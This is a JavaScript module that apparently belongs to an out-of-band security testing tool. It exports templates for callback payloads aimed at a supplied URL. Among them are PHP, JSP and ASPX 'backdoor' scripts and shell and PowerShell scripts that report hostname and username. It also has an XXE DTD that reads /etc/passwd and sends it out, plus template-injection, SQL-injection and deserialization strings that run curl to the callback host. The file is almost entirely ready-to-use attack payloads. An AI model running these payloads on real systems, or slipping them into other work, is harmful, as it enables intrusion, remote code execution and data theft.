export const scriptTemplates = {
  // Shell scripts
  shell: {
    bash: (callbackUrl) => `#!/bin/bash
# Callback test script
curl -X POST "${callbackUrl}" \\
  -H "Content-Type: application/json" \\
  -d '{"test": "data", "timestamp": "'$(date +%s)'"}'
`,
    sh: (callbackUrl) => `#!/bin/sh
# Simple callback script
wget -qO- --post-data='{"test":"data"}' \\
  --header='Content-Type: application/json' \\
  "${callbackUrl}"
`
  },

  // PHP backdoors/shells
  backdoor: {
    php: (callbackUrl) => `<?php
// Simple PHP callback
$data = array(
    'hostname' => gethostname(),
    'php_version' => phpversion(),
    'server_software' => $_SERVER['SERVER_SOFTWARE'],
    'document_root' => $_SERVER['DOCUMENT_ROOT'],
    'timestamp' => time()
);

$ch = curl_init('${callbackUrl}');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
?>`,
    jsp: (callbackUrl) => `<%@ page import="java.net.*,java.io.*" %>
<%
// JSP callback
String callbackUrl = "${callbackUrl}";
String data = "hostname=" + InetAddress.getLocalHost().getHostName();
URL url = new URL(callbackUrl);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setDoOutput(true);
conn.setRequestMethod("POST");
OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
writer.write(data);
writer.flush();
writer.close();
conn.getResponseCode();
%>`,
    aspx: (callbackUrl) => `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<%
// ASPX callback
string callbackUrl = "${callbackUrl}";
string data = "hostname=" + System.Environment.MachineName;
using (WebClient client = new WebClient())
{
    client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
    client.UploadString(callbackUrl, data);
}
%>`
  },

  // Command execution
  cmd: {
    bat: (callbackUrl) => `@echo off
REM Windows batch callback
curl -X POST "${callbackUrl}" -d "hostname=%COMPUTERNAME%&user=%USERNAME%"
`,
    ps1: (callbackUrl) => `# PowerShell callback script
$data = @{
    hostname = $env:COMPUTERNAME
    user = $env:USERNAME
    timestamp = Get-Date -UFormat %s
}
Invoke-RestMethod -Uri "${callbackUrl}" -Method Post -Body ($data | ConvertTo-Json) -ContentType "application/json"
`,
    py: (callbackUrl) => `#!/usr/bin/env python3
import requests
import platform
import json
from datetime import datetime

# Python callback script
data = {
    'hostname': platform.node(),
    'platform': platform.system(),
    'python_version': platform.python_version(),
    'timestamp': datetime.now().isoformat()
}

requests.post('${callbackUrl}', json=data)
`
  },

  // Web-based callbacks
  web: {
    html: (callbackUrl) => `<!DOCTYPE html>
<html>
<head>
    <title>Callback Test</title>
</head>
<body>
    <h1>Callback Test Page</h1>
    <script>
        fetch('${callbackUrl}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                timestamp: Date.now()
            })
        });
    </script>
</body>
</html>`,
    js: (callbackUrl) => `// JavaScript callback
fetch('${callbackUrl}', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        userAgent: navigator.userAgent,
        location: window.location.href,
        timestamp: Date.now()
    })
}).then(r => r.text()).then(console.log);
`,
    xml: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<root>
  <data>&xxe;</data>
</root>`
  },

  // SQL injection callbacks
  sql: {
    mssql: (callbackUrl) => `-- MSSQL callback (requires xp_cmdshell)
EXEC master..xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri ${callbackUrl} -Method POST"'
`,
    mysql: (callbackUrl) => `-- MySQL callback (using LOAD_FILE and outfile)
SELECT LOAD_FILE('${callbackUrl}');
`,
    oracle: (callbackUrl) => `-- Oracle callback
SELECT UTL_HTTP.REQUEST('${callbackUrl}') FROM DUAL;
`
  },

  // XXE (XML External Entity) payloads
  xxe: {
    dtd: (callbackUrl) => `<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '${callbackUrl}?data=%file;'>">
%eval;
%exfiltrate;`,
    xml: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<root>
  <callback>&xxe;</callback>
</root>`,
    svg: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
    docx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "${callbackUrl}/evil.dtd">
  %remote;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>`,
    xlsx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c t="inlineStr"><is><t>&xxe;</t></is></c>
    </row>
  </sheetData>
</worksheet>`
  },

  // SSRF (Server-Side Request Forgery) payloads
  ssrf: {
    url: (callbackUrl) => `${callbackUrl}`,
    xml: (callbackUrl) => `<?xml version="1.0"?>
<root>
  <url>${callbackUrl}</url>
</root>`,
    json: (callbackUrl) => `{
  "url": "${callbackUrl}",
  "callback": "${callbackUrl}",
  "webhook": "${callbackUrl}"
}`,
    yaml: (callbackUrl) => `url: ${callbackUrl}
callback: ${callbackUrl}
webhook: ${callbackUrl}`,
    html: (callbackUrl) => `<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0;url=${callbackUrl}">
</head>
<body>
  <img src="${callbackUrl}/image.png">
  <iframe src="${callbackUrl}"></iframe>
</body>
</html>`
  },

  // Template Injection payloads
  template: {
    jinja2: (callbackUrl) => `{{ ''.__class__.__mro__[1].__subclasses__()[408]('curl ${callbackUrl}',shell=True,stdout=-1).communicate() }}`,
    freemarker: (callbackUrl) => `<#assign ex="freemarker.template.utility.Execute"?new()> \${ex("curl ${callbackUrl}")}`,
    velocity: (callbackUrl) => `#set($x='')
#set($rt = $x.class.forName('java.lang.Runtime'))
#set($chr = $x.class.forName('java.lang.Character'))
#set($str = $x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('curl ${callbackUrl}'))
$ex.waitFor()`,
    twig: (callbackUrl) => `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl ${callbackUrl}")}}`
  },

  // Deserialization payloads
  deserial: {
    java: (callbackUrl) => `// Java deserialization payload
// Requires ysoserial tool to generate proper serialized object
// Example: java -jar ysoserial.jar CommonsCollections1 "curl ${callbackUrl}" | base64
H4sIAAAAAAAAAJ...base64_payload_here...==`,
    php: (callbackUrl) => `O:8:"stdClass":1:{s:4:"exec";s:${callbackUrl.length}:"${callbackUrl}";}`,
    python: (callbackUrl) => `cos
system
(S'curl ${callbackUrl}'
tR.`,
    dotnet: (callbackUrl) => `<ObjectDataProvider MethodName="Start" ObjectType="{x:Type Process}">
  <ObjectDataProvider.MethodParameters>
    <system:String>cmd</system:String>
    <system:String>/c curl ${callbackUrl}</system:String>
  </ObjectDataProvider.MethodParameters>
</ObjectDataProvider>`
  }
};

export const getMimeType = (format) => {
  const mimeTypes = {
    // Shell
    bash: 'application/x-sh',
    sh: 'application/x-sh',

    // PHP/Web backends
    php: 'application/x-httpd-php',
    jsp: 'application/x-jsp',
    aspx: 'text/plain',

    // Command scripts
    bat: 'application/bat',
    ps1: 'application/x-powershell',
    py: 'text/x-python',

    // Web
    html: 'text/html',
    js: 'application/javascript',
    xml: 'application/xml',

    // SQL
    mssql: 'text/plain',
    mysql: 'text/plain',
    oracle: 'text/plain',

    // XXE
    dtd: 'application/xml-dtd',
    svg: 'image/svg+xml',
    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',

    // SSRF
    url: 'text/plain',
    json: 'application/json',
    yaml: 'application/x-yaml',

    // Template Injection
    jinja2: 'text/plain',
    freemarker: 'text/plain',
    velocity: 'text/plain',
    twig: 'text/plain',

    // Deserialization
    java: 'application/octet-stream',
    dotnet: 'application/xml',

    // Default
    txt: 'text/plain'
  };

  return mimeTypes[format] || 'text/plain';
};
